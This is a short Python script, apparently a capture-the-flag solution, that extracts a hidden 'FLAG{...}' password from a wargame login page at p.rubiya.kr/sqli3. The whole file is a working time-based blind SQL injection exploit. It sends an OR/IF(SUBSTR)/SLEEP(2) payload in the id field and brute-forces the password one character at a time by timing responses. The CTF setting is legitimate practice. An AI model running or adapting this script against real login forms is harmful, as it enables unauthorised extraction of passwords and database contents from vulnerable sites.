import requests
def my_request(uid):
	url = "https://p.rubiya.kr/sqli3/"
	param = {
		'id': uid,
		'pw': '1'
	}
	response = requests.post(url,data=param)
	return response

def find_pw():
	res = "FLAG{"
	cnt = 5
	for num in range(0,41-5):
		cnt += 1
		for ch in range(33,127):
			uid = f"\' or if(substr(pw,1,{cnt})=\'{res}"+chr(ch)+"\',sleep(2),1)#"
			response = my_request(uid)
			print(uid)
			if response.elapsed.total_seconds() > 1:
				res += chr(ch)
				break

	print("I got pw:",res)

if __name__ == "__main__":
	find_pw()
